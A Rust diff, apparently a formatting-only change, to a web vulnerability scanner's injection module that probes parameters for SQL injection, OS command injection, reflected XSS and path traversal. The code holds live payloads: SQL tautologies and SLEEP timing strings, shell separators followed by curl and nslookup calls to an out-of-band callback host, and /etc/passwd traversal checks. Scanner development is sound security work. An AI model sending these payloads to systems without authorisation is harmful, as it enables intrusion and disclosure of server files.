@@ -98,12 +98,12 @@ enum Loc {
 /// One fuzzable location on one endpoint.
 struct Site {
     method: String,
-    url: String,                    // full URL (query included)
+    url: String, // full URL (query included)
     loc: Loc,
-    param: String,                  // the field/param being fuzzed (segment for Path)
-    base_value: String,             // its baseline value (keeps the request valid)
-    body: Vec<(String, String)>,    // baseline body fields (for body sites)
-    path_idx: usize,                // which path segment (Loc::Path only)
+    param: String,               // the field/param being fuzzed (segment for Path)
+    base_value: String,          // its baseline value (keeps the request valid)
+    body: Vec<(String, String)>, // baseline body fields (for body sites)
+    path_idx: usize,             // which path segment (Loc::Path only)
 }
 
 impl Site {
@@ -122,15 +122,25 @@ impl Site {
                     })
                     .collect::<Vec<_>>()
                     .join("&");
-                (self.url.clone(), Some((body, "application/x-www-form-urlencoded")))
+                (
+                    self.url.clone(),
+                    Some((body, "application/x-www-form-urlencoded")),
+                )
             }
             Loc::BodyJson => {
                 let mut obj = serde_json::Map::new();
                 for (k, v) in &self.body {
-                    let vv = if k == &self.param { value.to_string() } else { v.clone() };
+                    let vv = if k == &self.param {
+                        value.to_string()
+                    } else {
+                        v.clone()
+                    };
                     obj.insert(k.clone(), Value::String(vv));
                 }
-                (self.url.clone(), Some((Value::Object(obj).to_string(), "application/json")))
+                (
+                    self.url.clone(),
+                    Some((Value::Object(obj).to_string(), "application/json")),
+                )
             }
         }
     }
@@ -223,8 +233,13 @@ fn sites_for(ep: &InjEndpoint) -> Vec<Site> {
     for name in qnames {
         let base = current_value(&ep.url, &name).unwrap_or_else(|| "1".to_string());
         out.push(Site {
-            method: method.clone(), url: ep.url.clone(), loc: Loc::Query,
-            param: name, base_value: base, body: Vec::new(), path_idx: 0,
+            method: method.clone(),
+            url: ep.url.clone(),
+            loc: Loc::Query,
+            param: name,
+            base_value: base,
+            body: Vec::new(),
+            path_idx: 0,
         });
     }
     // Id-like path segments (numeric / uuid / slug-with-digit) are fuzzed too:
@@ -235,22 +250,55 @@ fn sites_for(ep: &InjEndpoint) -> Vec<Site> {
     for (i, seg) in path.split('/').enumerate() {
         if looks_like_id_seg(seg) {
             out.push(Site {
-                method: method.clone(), url: ep.url.clone(), loc: Loc::Path,
-                param: seg.to_string(), base_value: seg.to_string(), body: Vec::new(), path_idx: i,
+                method: method.clone(),
+                url: ep.url.clone(),
+                loc: Loc::Path,
+                param: seg.to_string(),
+                base_value: seg.to_string(),
+                body: Vec::new(),
+                path_idx: i,
             });
         }
     }
     if !ep.body.is_empty() {
-        let loc = if ep.body_type.eq_ignore_ascii_case("json") { Loc::BodyJson } else { Loc::BodyForm };
-        let body: Vec<(String, String)> = ep.body.iter()
-            .map(|f| (f.name.clone(), if f.value.is_empty() { "test".into() } else { f.value.clone() }))
+        let loc = if ep.body_type.eq_ignore_ascii_case("json") {
+            Loc::BodyJson
+        } else {
+            Loc::BodyForm
+        };
+        let body: Vec<(String, String)> = ep
+            .body
+            .iter()
+            .map(|f| {
+                (
+                    f.name.clone(),
+                    if f.value.is_empty() {
+                        "test".into()
+                    } else {
+                        f.value.clone()
+                    },
+                )
+            })
             .collect();
-        let bmethod = if method == "GET" { "POST".to_string() } else { method.clone() };
+        let bmethod = if method == "GET" {
+            "POST".to_string()
+        } else {
+            method.clone()
+        };
         for f in &ep.body {
-            let base = body.iter().find(|(k, _)| k == &f.name).map(|(_, v)| v.clone()).unwrap_or_default();
+            let base = body
+                .iter()
+                .find(|(k, _)| k == &f.name)
+                .map(|(_, v)| v.clone())
+                .unwrap_or_default();
             out.push(Site {
-                method: bmethod.clone(), url: ep.url.clone(), loc, param: f.name.clone(),
-                base_value: base, body: body.clone(), path_idx: 0,
+                method: bmethod.clone(),
+                url: ep.url.clone(),
+                loc,
+                param: f.name.clone(),
+                base_value: base,
+                body: body.clone(),
+                path_idx: 0,
             });
         }
     }
@@ -271,13 +319,19 @@ fn looks_like_id_seg(seg: &str) -> bool {
     }
     seg.len() >= 4
         && seg.chars().any(|c| c.is_ascii_digit())
-        && seg.chars().all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_')
+        && seg
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_')
 }
 
 fn path_only(url: &str) -> String {
     let after = url.split("://").nth(1).unwrap_or(url);
     let start = after.find('/').unwrap_or(after.len());
-    after[start..].split(['?', '#']).next().unwrap_or("").to_string()
+    after[start..]
+        .split(['?', '#'])
+        .next()
+        .unwrap_or("")
+        .to_string()
 }
 
 /// Rebuild `url` with path segment `idx` replaced by the percent-encoded `value`.
@@ -303,7 +357,13 @@ fn set_path_seg(url: &str, idx: usize, value: &str) -> String {
 
 async fn send_site(client: &Client, site: &Site, value: &str) -> Option<Resp> {
     let (url, body) = site.render(value);
-    send(client, &site.method, &url, body.as_ref().map(|(b, c)| (b.as_str(), *c))).await
+    send(
+        client,
+        &site.method,
+        &url,
+        body.as_ref().map(|(b, c)| (b.as_str(), *c)),
+    )
+    .await
 }
 
 // ---------------------------------------------------------------- SQLi
@@ -320,15 +380,26 @@ async fn probe_sqli(client: &Client, site: &Site, baseline: &Resp) -> Option<Val
                     let ctrl_clean = ctrl.map(|c| !is_sql_error(&c.body)).unwrap_or(false);
                     let again = send_site(client, site, &format!("{base}{q}")).await;
                     if ctrl_clean && again.map(|a| is_sql_error(&a.body)).unwrap_or(false) {
-                        return Some(finding("sqli", "SQL injection (error-based)", "high", site,
-                            format!("Injecting a single unbalanced quote into the {} produced a database error, and a balanced quote did not -- the value reaches a SQL statement unparameterised.", site.where_label())));
+                        return Some(finding(
+                            "sqli",
+                            "SQL injection (error-based)",
+                            "high",
+                            site,
+                            format!(
+                                "Injecting a single unbalanced quote into the {} produced a database error, and a balanced quote did not -- the value reaches a SQL statement unparameterised.",
+                                site.where_label()
+                            ),
+                        ));
                     }
                 }
             }
         }
     }
     // 2) boolean-based
-    let pairs = [("' OR '1'='1", "' OR '1'='2"), (" OR 1=1-- -", " OR 1=2-- -")];
+    let pairs = [
+        ("' OR '1'='1", "' OR '1'='2"),
+        (" OR 1=1-- -", " OR 1=2-- -"),
+    ];
     for (t, f) in pairs {
         let rt = send_site(client, site, &format!("{base}{t}")).await;
         let rf = send_site(client, site, &format!("{base}{f}")).await;
@@ -338,8 +409,18 @@ async fn probe_sqli(client: &Client, site: &Site, baseline: &Resp) -> Option<Val
                 let rf2 = send_site(client, site, &format!("{base}{f}")).await;
                 if let (Some(a2), Some(b2)) = (rt2, rf2) {
                     if boolean_differential(baseline, &a2, &b2) {
-                        return Some(finding("sqli", "SQL injection (boolean-based blind)", "high", site,
-                            format!("A tautology and a contradiction injected into the {} produced consistently different result sets (true={} bytes, false={} bytes), indicating the value is evaluated inside a SQL query.", site.where_label(), a2.body.len(), b2.body.len())));
+                        return Some(finding(
+                            "sqli",
+                            "SQL injection (boolean-based blind)",
+                            "high",
+                            site,
+                            format!(
+                                "A tautology and a contradiction injected into the {} produced consistently different result sets (true={} bytes, false={} bytes), indicating the value is evaluated inside a SQL query.",
+                                site.where_label(),
+                                a2.body.len(),
+                                b2.body.len()
+                            ),
+                        ));
                     }
                 }
             }
@@ -355,16 +436,33 @@ async fn probe_sqli(client: &Client, site: &Site, baseline: &Resp) -> Option<Val
     ];
     for p in payloads {
         let r = send_site(client, site, &format!("{base}{p}")).await;
-        if r.as_ref().map(|x| x.elapsed_ms >= SLEEP_THRESHOLD_MS).unwrap_or(false) {
-            let zero = p.replace(&format!("SLEEP({SLEEP_SECS})"), "SLEEP(0)")
-                        .replace(&format!("pg_sleep({SLEEP_SECS})"), "pg_sleep(0)");
+        if r.as_ref()
+            .map(|x| x.elapsed_ms >= SLEEP_THRESHOLD_MS)
+            .unwrap_or(false)
+        {
+            let zero = p
+                .replace(&format!("SLEEP({SLEEP_SECS})"), "SLEEP(0)")
+                .replace(&format!("pg_sleep({SLEEP_SECS})"), "pg_sleep(0)");
             let rc = send_site(client, site, &format!("{base}{zero}")).await;
             let again = send_site(client, site, &format!("{base}{p}")).await;
-            let ctrl_fast = rc.map(|x| x.elapsed_ms < SLEEP_THRESHOLD_MS).unwrap_or(false);
-            let repro = again.map(|x| x.elapsed_ms >= SLEEP_THRESHOLD_MS).unwrap_or(false);
+            let ctrl_fast = rc
+                .map(|x| x.elapsed_ms < SLEEP_THRESHOLD_MS)
+                .unwrap_or(false);
+            let repro = again
+                .map(|x| x.elapsed_ms >= SLEEP_THRESHOLD_MS)
+                .unwrap_or(false);
             if ctrl_fast && repro {
-                return Some(finding("sqli", "SQL injection (time-based blind)", "high", site,
-                    format!("A `SLEEP({SLEEP_SECS})` injected into the {} delayed the response past {}ms while a `SLEEP(0)` control returned promptly and the delay reproduced.", site.where_label(), SLEEP_THRESHOLD_MS)));
+                return Some(finding(
+                    "sqli",
+                    "SQL injection (time-based blind)",
+                    "high",
+                    site,
+                    format!(
+                        "A `SLEEP({SLEEP_SECS})` injected into the {} delayed the response past {}ms while a `SLEEP(0)` control returned promptly and the delay reproduced.",
+                        site.where_label(),
+                        SLEEP_THRESHOLD_MS
+                    ),
+                ));
             }
         }
     }
@@ -372,39 +470,85 @@ async fn probe_sqli(client: &Client, site: &Site, baseline: &Resp) -> Option<Val
 }
 
 // ---------------------------------------------------------------- OS command injection
-async fn probe_cmdi(client: &Client, site: &Site, oast: Option<&crate::oast::OastClient>) -> Option<Value> {
+async fn probe_cmdi(
+    client: &Client,
+    site: &Site,
+    oast: Option<&crate::oast::OastClient>,
+) -> Option<Value> {
     let base = &site.base_value;
     if let Some(oc) = oast {
         if let Some(reg) = oc.register(client).await {
             let host = oc.host(&reg);
             for sep in [";", "|", "&&", "$(", "`"] {
-                let close = if sep == "$(" { ")" } else if sep == "`" { "`" } else { "" };
-                let _ = send_site(client, site, &format!("{base}{sep}curl http://{host}/c{close}")).await;
-                let _ = send_site(client, site, &format!("{base}{sep}nslookup {host}{close}")).await;
+                let close = if sep == "$(" {
+                    ")"
+                } else if sep == "`" {
+                    "`"
+                } else {
+                    ""
+                };
+                let _ = send_site(
+                    client,
+                    site,
+                    &format!("{base}{sep}curl http://{host}/c{close}"),
+                )
+                .await;
+                let _ =
+                    send_site(client, site, &format!("{base}{sep}nslookup {host}{close}")).await;
             }
             for _ in 0..4 {
                 tokio::time::sleep(Duration::from_millis(700)).await;
                 if oc.poll(client, &reg).await > 0 {
                     oc.deregister(client, &reg).await;
-                    return Some(finding("cmdi", "OS command injection (blind, OAST-confirmed)", "critical", site,
-                        format!("A shell metacharacter + `curl`/`nslookup` injected into the {} produced an out-of-band callback -- the value is executed by a shell.", site.where_label())));
+                    return Some(finding(
+                        "cmdi",
+                        "OS command injection (blind, OAST-confirmed)",
+                        "critical",
+                        site,
+                        format!(
+                            "A shell metacharacter + `curl`/`nslookup` injected into the {} produced an out-of-band callback -- the value is executed by a shell.",
+                            site.where_label()
+                        ),
+                    ));
                 }
             }
             oc.deregister(client, &reg).await;
         }
     }
     for sep in [";", "|", "&&", "$(", "`"] {
-        let close = if sep == "$(" { ")" } else if sep == "`" { "`" } else { "" };
+        let close = if sep == "$(" {
+            ")"
+        } else if sep == "`" {
+            "`"
+        } else {
+            ""
+        };
         let pl = format!("{base}{sep}sleep {SLEEP_SECS}{close}");
         let r = send_site(client, site, &pl).await;
-        if r.as_ref().map(|x| x.elapsed_ms >= SLEEP_THRESHOLD_MS).unwrap_or(false) {
+        if r.as_ref()
+            .map(|x| x.elapsed_ms >= SLEEP_THRESHOLD_MS)
+            .unwrap_or(false)
+        {
             let ctrl = send_site(client, site, &format!("{base}{sep}sleep 0{close}")).await;
             let again = send_site(client, site, &pl).await;
-            let ctrl_fast = ctrl.map(|x| x.elapsed_ms < SLEEP_THRESHOLD_MS).unwrap_or(false);
-            let repro = again.map(|x| x.elapsed_ms >= SLEEP_THRESHOLD_MS).unwrap_or(false);
+            let ctrl_fast = ctrl
+                .map(|x| x.elapsed_ms < SLEEP_THRESHOLD_MS)
+                .unwrap_or(false);
+            let repro = again
+                .map(|x| x.elapsed_ms >= SLEEP_THRESHOLD_MS)
+                .unwrap_or(false);
             if ctrl_fast && repro {
-                return Some(finding("cmdi", "OS command injection (time-based blind)", "critical", site,
-                    format!("A shell `sleep {SLEEP_SECS}` injected into the {} (separator `{sep}`) delayed the response past {}ms while `sleep 0` returned promptly and the delay reproduced.", site.where_label(), SLEEP_THRESHOLD_MS)));
+                return Some(finding(
+                    "cmdi",
+                    "OS command injection (time-based blind)",
+                    "critical",
+                    site,
+                    format!(
+                        "A shell `sleep {SLEEP_SECS}` injected into the {} (separator `{sep}`) delayed the response past {}ms while `sleep 0` returned promptly and the delay reproduced.",
+                        site.where_label(),
+                        SLEEP_THRESHOLD_MS
+                    ),
+                ));
             }
         }
     }
@@ -424,8 +568,16 @@ async fn probe_xss(client: &Client, site: &Site) -> Option<Value> {
     if r.body.contains(&raw_break) {
         let r2 = send_site(client, site, &payload).await?;
         if r2.body.contains(&raw_break) {
-            return Some(finding("xss", "Reflected cross-site scripting (XSS)", "high", site,
-                format!("An `<img onerror>` payload injected into the {} was reflected into the response body without HTML-encoding, so injected markup executes in the victim's browser.", site.where_label())));
+            return Some(finding(
+                "xss",
+                "Reflected cross-site scripting (XSS)",
+                "high",
+                site,
+                format!(
+                    "An `<img onerror>` payload injected into the {} was reflected into the response body without HTML-encoding, so injected markup executes in the victim's browser.",
+                    site.where_label()
+                ),
+            ));
         }
     }
     None
@@ -446,13 +598,27 @@ async fn probe_lfi(client: &Client, site: &Site, baseline: &Resp) -> Option<Valu
     for p in payloads {
         let r = send_site(client, site, p).await?;
         let hit_unix = PASSWD_RE.is_match(&r.body);
-        let hit_win = r.body.contains("[extensions]") || r.body.contains("[fonts]") || r.body.contains("for 16-bit app support");
+        let hit_win = r.body.contains("[extensions]")
+            || r.body.contains("[fonts]")
+            || r.body.contains("for 16-bit app support");
         if hit_unix || hit_win {
             let again = send_site(client, site, p).await?;
             if PASSWD_RE.is_match(&again.body) || again.body.contains("[extensions]") {
-                let what = if hit_unix { "/etc/passwd" } else { "windows/win.ini" };
-                return Some(finding("lfi", "Local file inclusion / path traversal", "high", site,
-                    format!("A traversal payload in the {} returned the contents of `{what}` -- the parameter is used to build a file path without containment.", site.where_label())));
+                let what = if hit_unix {
+                    "/etc/passwd"
+                } else {
+                    "windows/win.ini"
+                };
+                return Some(finding(
+                    "lfi",
+                    "Local file inclusion / path traversal",
+                    "high",
+                    site,
+                    format!(
+                        "A traversal payload in the {} returned the contents of `{what}` -- the parameter is used to build a file path without containment.",
+                        site.where_label()
+                    ),
+                ));
             }
         }
     }
@@ -460,7 +626,12 @@ async fn probe_lfi(client: &Client, site: &Site, baseline: &Resp) -> Option<Valu
 }
 
 // ---------------------------------------------------------------- helpers
-async fn send(client: &Client, method: &str, url: &str, body: Option<(&str, &str)>) -> Option<Resp> {
+async fn send(
+    client: &Client,
+    method: &str,
+    url: &str,
+    body: Option<(&str, &str)>,
+) -> Option<Resp> {
     let mut rb = match method {
         "POST" => client.post(url),
         "PUT" => client.put(url),
@@ -476,7 +647,11 @@ async fn send(client: &Client, method: &str, url: &str, body: Option<(&str, &str
         Ok(r) => {
             let status = r.status().as_u16();
             let body = read_body_capped(r).await;
-            Some(Resp { status, body, elapsed_ms: t0.elapsed().as_millis() })
+            Some(Resp {
+                status,
+                body,
+                elapsed_ms: t0.elapsed().as_millis(),
+            })
         }
         Err(_) => None,
     }
@@ -519,7 +694,10 @@ fn build_client(params: &InjectParams) -> Option<Client> {
         attribution_token: None,
         emulate: !matches!(mode, adaptive::identity::Mode::Fast),
         timeout: Some(Duration::from_millis(
-            params.timeout_ms.clamp(1000, 120_000).max((SLEEP_SECS as u64) * 1000 + 3000),
+            params
+                .timeout_ms
+                .clamp(1000, 120_000)
+                .max(SLEEP_SECS * 1000 + 3000),
         )),
         redirect: transport::Redirect::Limited(3),
         accept_invalid_certs: true,
@@ -545,7 +723,9 @@ fn query_param_names(url: &str) -> Vec<String> {
 }
 
 fn current_value(url: &str, param: &str) -> Option<String> {
-    let q = url.split_once('?').map(|(_, q)| q.split('#').next().unwrap_or(q))?;
+    let q = url
+        .split_once('?')
+        .map(|(_, q)| q.split('#').next().unwrap_or(q))?;
     for pair in q.split('&') {
         if let Some((k, v)) = pair.split_once('=') {
             if k == param {
@@ -594,7 +774,9 @@ fn pct_encode(s: &str) -> String {
     let mut out = String::with_capacity(s.len() * 3);
     for b in s.bytes() {
         match b {
-            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => out.push(b as char),
+            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
+                out.push(b as char)
+            }
             _ => out.push_str(&format!("%{b:02X}")),
         }
     }
